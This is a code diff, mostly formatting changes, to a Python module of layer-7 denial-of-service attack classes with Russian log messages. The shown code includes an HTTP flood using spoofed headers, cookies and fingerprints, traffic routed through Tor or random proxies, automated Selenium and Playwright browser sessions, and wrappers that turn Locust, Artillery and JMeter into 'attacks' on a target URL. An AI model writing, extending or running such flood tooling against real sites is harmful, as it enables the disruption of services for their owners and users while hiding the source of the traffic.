@@ -7,7 +7,7 @@ from playwright.async_api import async_playwright
 from ..config import Config, logger
 from ..utils.spoofing import generate_spoofed_headers, generate_cookies, spoof_fingerprint
 from ..utils.proxy import get_async_tor_connector, get_random_proxy
-import threading
+
 
 class Layer7Attack:
     def __init__(self, target_url, duration, attack_type):
@@ -18,6 +18,7 @@ class Layer7Attack:
 
     async def stop(self):
         self.stop_event.set()
+
 
 class HTTPAttack(Layer7Attack):
     async def run(self, threads=Config['threads']):
@@ -41,16 +42,18 @@ class HTTPAttack(Layer7Attack):
                 except Exception as e:
                     logger.error(f"Ошибка в {self.attack_type}: {e}")
                 await asyncio.sleep(0.1)
-        
+
         connector = await get_async_tor_connector() if Config["use_tor"] else None
         async with aiohttp.ClientSession(connector=connector) as session:
             tasks = [http_flood(session) for _ in range(threads)]
             await asyncio.gather(*tasks)
 
+
 class BrowserAttack(Layer7Attack):
     def run_selenium_in_thread(self):
         options = Options()
-        options.add_argument(f"user-agent={generate_spoofed_headers()['User-Agent']}")
+        options.add_argument(
+            f"user-agent={generate_spoofed_headers()['User-Agent']}")
         if Config["use_proxy"]:
             proxy = get_random_proxy()
             if proxy and 'socks5' in proxy:
@@ -62,10 +65,13 @@ class BrowserAttack(Layer7Attack):
                 try:
                     driver.get(self.target_url)
                     if Config["browser_behavior"]["clicks"]:
-                        driver.execute_script("let links = document.querySelectorAll('a'); if(links.length) links[0].click();")
+                        driver.execute_script(
+                            "let links = document.querySelectorAll('a'); if(links.length) links[0].click();")
                     if Config["browser_behavior"]["scroll"]:
-                        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
-                    logger.info(f"{self.attack_type} Selenium запрос отправлен")
+                        driver.execute_script(
+                            "window.scrollTo(0, document.body.scrollHeight);")
+                    logger.info(
+                        f"{self.attack_type} Selenium запрос отправлен")
                     time.sleep(Config["browser_behavior"]["delay"])
                 except Exception as e:
                     logger.error(f"Ошибка в Selenium: {e}")
@@ -89,7 +95,8 @@ class BrowserAttack(Layer7Attack):
                                 await links[0].click()
                         if Config["browser_behavior"]["scroll"]:
                             await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
-                        logger.info(f"{self.attack_type} Playwright запрос отправлен")
+                        logger.info(
+                            f"{self.attack_type} Playwright запрос отправлен")
                         await asyncio.sleep(Config["browser_behavior"]["delay"])
                     except Exception as e:
                         logger.error(f"Ошибка в Playwright: {e}")
@@ -103,6 +110,7 @@ class BrowserAttack(Layer7Attack):
             await asyncio.gather(*(asyncio.to_thread(self.run_selenium_in_thread) for _ in range(threads)))
         elif Config["use_browser"] == "playwright":
             await asyncio.gather(*(self.run_playwright() for _ in range(threads)))
+
 
 def get_locust_attack():
     try:
@@ -119,10 +127,11 @@ def get_locust_attack():
                     @task
                     def stress(self):
                         try:
-                            self.client.get("/", headers=generate_spoofed_headers(), cookies=generate_cookies())
+                            self.client.get(
+                                "/", headers=generate_spoofed_headers(), cookies=generate_cookies())
                         except Exception as e:
                             logger.error(f"Ошибка в Locust: {e}")
-                
+
                 from locust.env import Environment
                 env = Environment(user_classes=[StressUser])
                 env.create_local_runner()
@@ -130,11 +139,12 @@ def get_locust_attack():
                 time.sleep(self.duration)
                 env.runner.quit()
                 logger.info("Locust атака завершена")
-        
+
         return LocustAttack
     except ImportError:
         logger.warning("Locust not installed. Skipping Locust attack method.")
         return None
+
 
 def get_artillery_attack():
     try:
@@ -162,17 +172,20 @@ def get_artillery_attack():
                 }
                 with open("artillery_config.json", "w") as f:
                     json.dump(config, f)
-                
+
                 try:
-                    subprocess.run(["artillery", "run", "artillery_config.json"], check=True)
+                    subprocess.run(
+                        ["artillery", "run", "artillery_config.json"], check=True)
                     logger.info("Artillery атака завершена")
                 except Exception as e:
                     logger.error(f"Ошибка в Artillery: {e}")
-        
+
         return ArtilleryAttack
     except ImportError:
-        logger.warning("Artillery not installed. Skipping Artillery attack method.")
+        logger.warning(
+            "Artillery not installed. Skipping Artillery attack method.")
         return None
+
 
 def get_jmeter_attack():
     try:
@@ -235,17 +248,19 @@ def get_jmeter_attack():
                 """
                 with open("test.jmx", "w") as f:
                     f.write(jmx_template)
-                
+
                 try:
-                    subprocess.run(["jmeter", "-n", "-t", "test.jmx", "-l", "logfile.jtl"], check=True)
+                    subprocess.run(
+                        ["jmeter", "-n", "-t", "test.jmx", "-l", "logfile.jtl"], check=True)
                     logger.info("JMeter атака завершена")
                 except Exception as e:
                     logger.error(f"Ошибка в JMeter: {e}")
-        
+
         return JMeterAttack
     except ImportError:
         logger.warning("JMeter not installed. Skipping JMeter attack method.")
         return None
+
 
 # Build the dictionary of attack classes, filtering out any that failed to load
 _L7_CLASSES = {
@@ -260,4 +275,5 @@ _L7_CLASSES = {
     'JMETER-ATTACK': get_jmeter_attack()
 }
 
-L7_CLASSES = {name: cls for name, cls in _L7_CLASSES.items() if cls is not None}
+L7_CLASSES = {name: cls for name,
+              cls in _L7_CLASSES.items() if cls is not None}
